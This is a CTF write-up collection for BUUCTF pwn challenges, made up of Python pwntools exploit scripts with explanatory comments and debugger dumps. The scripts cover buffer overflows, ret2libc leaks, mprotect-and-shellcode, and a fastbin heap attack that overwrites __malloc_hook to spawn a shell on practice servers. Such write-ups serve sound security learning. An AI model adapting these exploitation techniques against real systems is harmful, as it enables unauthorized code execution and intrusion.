# buuctf wp part5

[bin file](https://github.com/song-10/notes/tree/master/bin-file)

## not_the_same_3dsctf_2016

```python
    from pwn import *
    context.arch = 'i386'

    # p = process('./not_the_same')
    p = remote('node3.buuoj.cn',27317)
    elf = ELF('./not_the_same')

    def exp1(p,elf):
        shellcode_addr = 0x080EA000
        payload = 0x2d*'A'  # the padding need to debug
        payload += flat([elf.sym['mprotect'], elf.sym['main'], shellcode_addr, 0x80, 0x7])
        p.sendline(payload)
        # change the policy of shellcode_addr, and write shellcode to execve
        payload = 0x2d*'A'
        payload += flat([elf.sym['gets'], shellcode_addr, shellcode_addr])
        # after get shellcode to shellcode_addr, return to shellcode_addr and execve the shellcode
        p.sendline(payload)
        sleep(1)
        p.sendline(asm(shellcraft.sh()))
        sleep(1)
        p.interactive()

    def exp2(p,elf):
        # when debug locally, exp2 is not effectively
        fl4g = 0x080ECA2D
        payload = 'A'*0x2d
        payload += flat([elf.sym['get_secret'], elf.sym['write'], elf.sym['main'], 0, fl4g, 50])
        # execve function get_secret, and print the flag by function write
        p.sendline(payload)
        sleep(1)
        print p.recv()

    res = input('exp1(f) or exp2(s): ')
    if res == 'f':
        exp1(p,elf)
    elif res == 's':
        exp2(p,elf)
    else:
        print "Wrong input!"
```

## pwn1_sctf_2016

```python
from pwn import *

# the max input length was limit by 32,
# but padding to make overflow need 0x3c+0x4 characters,
# but if our input is 'I', the program will replace 'I' to 'you',
# so we just need input (0x3c+0x4)/3 'I' and 1 'a'(or any character except 'I')

context.arch = 'i386'

# p= process('./pwn1_sctf_2016')
p = remote('node3.buuoj.cn',26328)

payload = 'I'*((0x3c+0x4)//3) + 'A' + p32(ELF('./pwn1_sctf_2016').sym['get_flag'])
p.sendline(payload)
print p.recv()
```

## pwn2_sctf_2016

```python
from pwn import *
from LibcSearcher import *
context.arch='i386'

# p = process('./pwn2')
p = remote('node3.buuoj.cn',27048)
elf = ELF('./pwn2')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')

p.recvuntil("How many bytes do you want me to read? ")
p.sendline('-1')
# pass the judgement 'if ( v2 > 32 )',
# the function of get_n gets a number which class is unsigned int,
# so just input a negative like '-1',
# it could pass the judgement and will be transffer to 0xff by system,
# so, we can change the input length by this way
sleep(0.1)
p.recvuntil("data!\n")

payload = 'A'*(0x2c+4)
# payload += flat([elf.sym['printf'], elf.sym['main'], elf.got['printf']])
payload += flat([elf.sym['printf'], elf.sym['main'], elf.got['__libc_start_main']])
p.sendline(payload)
p.recvuntil('\n')
# leak the libc address to get shell

# printf_addr = u32(p.recv(4).ljust(4,'\x00'))
# log.success('printf_addr = %#x',printf_addr)

main_addr = u32(p.recv(4).ljust(4,'\x00'))
log.success('main = %#x',main_addr)

# system_addr = printf_addr - (libc.sym['printf'] - libc.sym['system'])
# binsh = printf_addr - (libc.sym['printf'] - next(libc.search('/bin/sh')))

# libc = LibcSearcher('printf',printf_addr)
# libc_base = printf_addr - libc.dump('printf')
libc = LibcSearcher('__libc_start_main',main_addr)
libc_base = main_addr - libc.dump('__libc_start_main')
# system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
# log.info('system_addr = %#x, binsh = %#x'%(system_addr,binsh))
execve_addr = libc_base + libc.dump('execve')
log.info('execve_addr = %#x, binsh = %#x'%(execve_addr,binsh))

p.recvuntil("How many bytes do you want me to read? ")
p.sendline('-1')
sleep(0.1)
p.recvuntil("data!\n")

payload = 'A'*(0x2c+0x4)
# payload += flat([system_addr, elf.sym['main'], binsh])
payload += flat([execve_addr, elf.sym['main'], binsh, 0, 0])
p.sendline(payload)
# sleep(1)
p.interactive()

# ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)
```

## rip

```python
from pwn import *

context.arch = 'amd64'

# p = process('./pwn1')
p = remote('node3.buuoj.cn',28245)

payload = 'a'*(0xf+0x8) # padding
payload += p64(0x401016) + p64(0x401186)    # retn to function of fun,ret = 0x401016

p.send(payload)
p.interactive()
```

## warmup_csaw_2016

```python
from pwn import *
context.arch = 'amd64'

p = process('./warmup_csaw_2016')
p = remote('node3.buuoj.cn',26357)

p.recvuntil('WOW:')
func_flag = int(p.recvuntil('\n>')[:-2],16)
log.info('func_flag = %#x',func_flag)

payload = 'a'*(0x40+8) + p64(func_flag)
p.sendline(payload)
print p.recv()
```

## 铁人三项(第五赛区)_2018_rop

```python
from pwn import *
from LibcSearcher import *
context.arch='i386'
# just leak the libc, and get shell

# p = process('./rop')
p = remote('node3.buuoj.cn',28307)
elf = ELF('./rop',checksec=False)

write_plt = elf.plt['write']
write_got = elf.got['write']
main = elf.sym['main']
ret = 0x08048199 # ret

payload = 'A'*(0x88+4)
# payload += flat([write_plt, main, 1, write_got, 4])
payload += flat([ret, write_plt, main, 1, write_got, 4])
p.send(payload)
write_addr = u32(p.recv(4))
log.success('write_addr = %#x',write_addr)

libc = LibcSearcher('write',write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh = %#x'%(system_addr,binsh))

paylaod = "a"*(0x88+4)
# paylaod += flat([system_addr, main, binsh])
paylaod += flat([ret, system_addr, main, binsh])
p.send(paylaod)
sleep(1)
p.interactive()
```

## bbys_tu_2016

```python
from pwn import *
context.arch='i386'

# just overflow

# p = process('./bbys')
p = remote('node3.buuoj.cn',27038)

payload = 'A'*(0x18) + p32(0x0804856D)
# p.recvuntil("This program is hungry. You should feed it.\n")
p.sendline(payload)
print p.recv()
```

## babyheap_0ctf_2017

```python
from pwn import *
context.arch='amd64'
# context.log_level='DEBUG'

# p = process('./babyheap')
p = remote('node3.buuoj.cn',29471)
elf = ELF('./babyheap',checksec=False)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

def allocate(size):
    ru("Command: ")
    sl('1')
    ru('Size:')
    sl(str(size))

def fill(index,size,content):
    ru("Command: ")
    sl('2')
    ru("Index: ")
    sl(str(index))
    ru("Size: ")
    sl(size)
    ru("Content: ")
    sl(content)

def free(index):
    ru("Command: ")
    sl('3')
    ru("Index: ")
    sl(str(index))

def dump(index):
    ru("Command: ")
    sl('4')
    ru("Index: ")
    sl(str(index))
    ru("Content: \n")
    # puts,which will put '\n'
    data = ru('\n')
    return data

def dbg():
    gdb.attach(p)
    pause()

# allocate 5 chunks include one small bin and four fast bins,
# one for padding next chunk's bk point to small bin,
# and one for it's bk point to small bin,
# and one for make pre fast bin'bk point to small bin,
# and one for padding the small bin to pass check,
# the small bin for leak


allocate(0x10) # i0,0x00
allocate(0x10) # i1,0x20
allocate(0x10) # i2,0x40
allocate(0x10) # i3,0x60
# fast bin size is 0x20,so we can calculate the offset each chunk
allocate(0x80) # i4,0x80
# dbg()
# pwndbg> x/24g 0x55e463353000
# 0x55e463353000:   0x0000000000000000  0x0000000000000021 <-- i0
# 0x55e463353010:   0x0000000000000000  0x0000000000000000
# 0x55e463353020:   0x0000000000000000  0x0000000000000021 <-- i1
# 0x55e463353030:   0x0000000000000000  0x0000000000000000
# 0x55e463353040:   0x0000000000000000  0x0000000000000021 <-- i2
# 0x55e463353050:   0x0000000000000000  0x0000000000000000
# 0x55e463353060:   0x0000000000000000  0x0000000000000021 <-- i3
# 0x55e463353070:   0x0000000000000000  0x0000000000000000
# 0x55e463353080:   0x0000000000000000  0x0000000000000091 <-- i4

free(1)
free(2)
# dbg()
# after free 2 fast bin,there is a fast bin list
# pwndbg> fast
# fastbins
# 0x20: 0x560eb6540040 -> 0x560eb6540020 <- 0x0
# 0x30: 0x0
# 0x40: 0x0
# 0x50: 0x0
# 0x60: 0x0
# 0x70: 0x0
# 0x80: 0x0
# pwndbg> x/24g 0x560eb6540000
# 0x560eb6540000:   0x0000000000000000  0x0000000000000021 <-- i0
# 0x560eb6540010:   0x0000000000000000  0x0000000000000000
# 0x560eb6540020:   0x0000000000000000  0x0000000000000021 <-- i1
# 0x560eb6540030:   0x0000000000000000  0x0000000000000000
# 0x560eb6540040:   0x0000000000000000  0x0000000000000021 <-- i2
# 0x560eb6540050:   0x0000560eb6540020  0x0000000000000000
# 0x560eb6540060:   0x0000000000000000  0x0000000000000021 <-- i3
# 0x560eb6540070:   0x0000000000000000  0x0000000000000000
# 0x560eb6540080:   0x0000000000000000  0x0000000000000091 <-- i4

# now we eidt i0 to make i1's bk point to small bin
payload = 'a'*0x10 + p64(0) + p64(0x21) # padding i1
payload += 'b'*0x10 + p64(0) + p64(0x21) + p8(0x80)
fill(0,len(payload),payload)
# dbg()
# now i2'bk point to small bin,
# and we allocate again we can get the small bin
# pwndbg> x/24g 0x55a1fa987000
# 0x55a1fa987000:   0x0000000000000000  0x0000000000000021 <-- i0
# 0x55a1fa987010:   0x6161616161616161  0x6161616161616161
# 0x55a1fa987020:   0x0000000000000000  0x0000000000000021 <-- i1
# 0x55a1fa987030:   0x6262626262626262  0x6262626262626262
# 0x55a1fa987040:   0x0000000000000000  0x0000000000000021 <-- i2
# 0x55a1fa987050:   0x000055a1fa987080  0x0000000000000000
# 0x55a1fa987060:   0x0000000000000000  0x0000000000000021 <-- i3
# 0x55a1fa987070:   0x0000000000000000  0x0000000000000000
# 0x55a1fa987080:   0x0000000000000000  0x0000000000000091 <-- i4

# pwndbg> fast
# fastbins
# 0x20: 0x55c37438a040 -> 0x55c37438a080 <- 0x0
# 0x30: 0x0
# 0x40: 0x0
# 0x50: 0x0
# 0x60: 0x0
# 0x70: 0x0
# 0x80: 0x0

# edit i3 to prepare for allcaote i4
payload = p64(0)*3 + p64(0x21)
fill(3,len(payload),payload)
allocate(0x10) # allocate the 0x55c37438a040 which i1 point to
allocate(0x10) # get i4(small bin) which i2 point to
# dbg()
payload = p64(0)*3 + p64(0x91)
fill(3,len(payload),payload)
allocate(0x80) # i5,to avoid the small bin which we will free later to combine with top chunk
free(4)
# the i4 was allcoate at first,now we free it
# we allocate a fastbin(i2) still point to here(0x564f38404080)
# so while we dump(2), it will dump i4's contnet actually,
# and meanwhile it's contains a addr which near the main_arena
# dbg()
# pwndbg> x/32g 0x5614b339c020
# 0x5614b339c020:   0x0000000000000000  0x0000000000000021 <--i1
# 0x5614b339c030:   0x6262626262626262  0x6262626262626262
# 0x5614b339c040:   0x0000000000000000  0x0000000000000021
# 0x5614b339c050:   0x0000000000000000  0x0000000000000000
# 0x5614b339c060:   0x0000000000000000  0x0000000000000021 <--i3
# 0x5614b339c070:   0x0000000000000000  0x0000000000000000
# 0x5614b339c080:   0x0000000000000000  0x0000000000000091 <-- i4,i2
# 0x5614b339c090:   0x00007f3579d12b78  0x00007f3579d12b78
# ......
# pwndbg> unsorted
# unsortedbin
# all: 0x5614b339c080 -> 0x7f3579d12b78 (main_arena+88) <- 0x5614b339c080
# pwndbg>

# now we can dump it to leak libc_base
addr = u64(dump(2)[:8].ljust(8,'\x00'))
leak('addr',addr)
main_arena = u64(dump(2)[:8].ljust(8,'\x00')) - 0x58
leak("main_arena",main_arena)
libc_base = addr - 0x88 - 0x3c4af0
leak("libc_base",libc_base)

# now we get libc address

# one_gadget = 0x45216 # execve("/bin/sh", rsp+0x30, environ
one_gadget = 0x4526a # execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# one_gadget = 0xf02a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# one_gadget = 0xf1147 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL


allocate(0x60)
free(4)
# dbg()
# pwndbg> x/4gx (long long)(&main_arena)-0x40+0xd
# 0x7f2bb9726aed <_IO_wide_data_0+301>: 0x2bb9725260000000  0x000000000000007f
# 0x7f2bb9726afd:   0x2bb93e7e20000000  0x2bb93e7a0000007f

payload = p64(main_arena - 0x40 + 0xd)
fill(2,len(payload),payload)
# dbg()
allocate(0x60) # i4
# now i4 we just freed was allocated to new i4
allocate(0x60) # i6
# when we continue to allcoate,we can get the fake chunk which point to 0x7f16a99d7b05

# fill(6,5,'A'*5)
# dbg()
# pwndbg> x/16g 0x7f146555eb20 -0x40
# 0x7f146555eae0 <_IO_wide_data_0+288>: 0x0000000000000000  0x0000000000000000
# 0x7f146555eaf0 <_IO_wide_data_0+304>: 0x00007f146555d260  0x4141410000000000
# 0x7f146555eb00 <__memalign_hook>: 0x00007f1465214141  0x00007f146521fa00
# 0x7f146555eb10 <__malloc_hook>:   0x0000000000000000  0x0000000000000000
# 0x7f146555eb20 <main_arena>:  0x0000000000000000  0x0000000000000000
# 0x7f146555eb30 <main_arena+16>:   0x0000000000000000  0x0000000000000000
# 0x7f146555eb40 <main_arena+32>:   0x0000000000000000  0x0000000000000000
# 0x7f146555eb50 <main_arena+48>:   0x146521fe20000000  0x0000000000000000

# now we can edit i6,and rewrite __malloc_hook to our one_gadget to get shell
payload = '\x00'*3 + p64(0)*2 + p64(libc_base+one_gadget)
fill(6,len(payload),payload)
# dbg()
# pwndbg> x/16g 0x7f3f2b9dcb00
# 0x7f3f2b9dcb00 <__memalign_hook>: 0x0000000000000000  0x0000000000000000
# 0x7f3f2b9dcb10 <__malloc_hook>:   0x00007f3f2b65d216  0x0000000000000000 <--malloc_hook was point to one_gadget
# 0x7f3f2b9dcb20 <main_arena>:  0x0000000000000000  0x0000000000000000
# 0x7f3f2b9dcb30 <main_arena+16>:   0x0000000000000000  0x0000000000000000
# 0x7f3f2b9dcb40 <main_arena+32>:   0x0000000000000000  0x0000000000000000
# 0x7f3f2b9dcb50 <main_arena+48>:   0x3f2b69de20000000  0x0000000000000000
# 0x7f3f2b9dcb60 <main_arena+64>:   0x0000000000000000  0x0000000000000000
# dbg()
# we need to try each one_gadget, one of them may didn't workrd

allocate(0x100)
itr()
```
